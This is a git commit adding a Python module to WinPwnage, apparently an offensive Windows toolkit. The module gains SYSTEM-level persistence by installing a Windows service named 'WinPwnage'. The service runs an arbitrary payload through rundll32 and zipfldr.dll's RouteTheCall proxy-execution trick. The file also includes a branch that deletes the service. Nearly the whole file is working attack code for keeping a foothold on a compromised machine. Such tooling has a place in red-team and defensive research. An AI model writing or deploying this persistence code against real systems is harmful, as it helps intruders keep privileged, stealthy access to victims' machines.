b8f56c13755057a1d1ee5b7186884f5c612fbb0d
rootm0s <rootm0s@protonmail.com>
2019-04-19 00:07:20 +0200

    persist with windows service

---
+++ winpwnage/functions/persist/persist_service.py
@@ -0,0 +1,64 @@
+from winpwnage.core.prints import *
+from winpwnage.core.utils import *
+from winpwnage.core.winstructures import *
+import os
+
+persist_service_info = {
+	"Description": "Gain persistence using Windows Service running as NT AUTHORITY SYSTEM",
+	"Id": "13",
+	"Type": "Persistence",
+	"Fixed In": "99999" if information().admin() == True else "0",
+	"Works From": "7600",
+	"Admin": True,
+	"Function Name": "persist_service",
+	"Function Payload": True,
+}
+
+
+# Slow:
+# ---> "{cmd_path} /c {payload}".format(cmd_path=os.path.join(information().system_directory(), "cmd.exe"), payload=payload)
+# Faster:
+# ---> "rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(), "zipfldr.dll"), payload=payload)
+
+def persist_service(payload, name="", add=True):
+	if not information().admin():
+		print_error("Cannot proceed, we are not elevated")
+		return False
+
+	if payloads().exe(payload):
+		servicename = "WinPwnage"
+		localhost = "\\\\localhost"
+		
+		if add:
+			print_info("Installing service")
+			schSCManager = OpenSCManager(localhost, "ServicesActive", 0x0001 | 0x0002)
+			if not schSCManager:
+				print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
+				return False
+
+			schService = CreateService(schSCManager, servicename, None, 0x00020000 | 0x00040000 | 0x0010, 0x00000010, 
+										0x00000002, 0x00000000, "rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(), "zipfldr.dll"),
+										#0x00000002, 0x00000000, "{cmd_path} /c {payload}".format(cmd_path=os.path.join(information().system_directory(), "cmd.exe"),
+										payload=payload), None, None, None, None, None)
+			if not schService:
+				print_error("Error while installing our service using CreateService: ({error})".format(error=GetLastError()))
+				return False
+			else:
+				print_success("Successfully installed service ({name}) to load {payload}".format(name=servicename,payload=payload))
+
+			CloseServiceHandle(schSCManager)
+			CloseServiceHandle(schService)
+		else:
+			schSCManager = OpenSCManager(localhost, "ServicesActive", 0x0001 | 0x0002)
+			if not schSCManager:
+				print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
+				return False
+
+			svcHandle = OpenService(schSCManager, servicename, 0x00010000)
+			if DeleteService(svcHandle):
+				print_success("Successfully deleted service ({name})".format(name=servicename))
+			else:
+				print_error("Unable to delete service ({name})".format(name=servicename))
+
+			CloseServiceHandle(schSCManager)
+			CloseServiceHandle(svcHandle)			
